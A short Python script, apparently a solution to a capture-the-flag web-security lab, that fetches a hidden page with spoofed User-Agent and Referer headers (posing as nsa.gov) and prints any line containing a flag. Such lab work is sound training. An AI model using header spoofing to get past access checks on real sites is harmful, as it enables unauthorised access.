import requests
import io
from bs4 import BeautifulSoup


def get_IP():
	ip = None
	with open('../../IP') as file:
		return file.readlines()[0].strip()


url = get_IP() + '?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c'

def change_header():
    headers = {
        'User-Agent' : 'ft_bornToSec',
        'Referer' : 'https://www.nsa.gov/'
    }
    r = requests.get(url, headers=headers)
    with io.open("./page.html", "w+", encoding="utf-8") as f:
        f.writelines(r.text)
    for line in r.text.splitlines():
        if line.lower().find('flag') != -1:
            print("Success ! we have a flag : ")
            text = BeautifulSoup(line, 'html.parser')
            print(text.text)
change_header()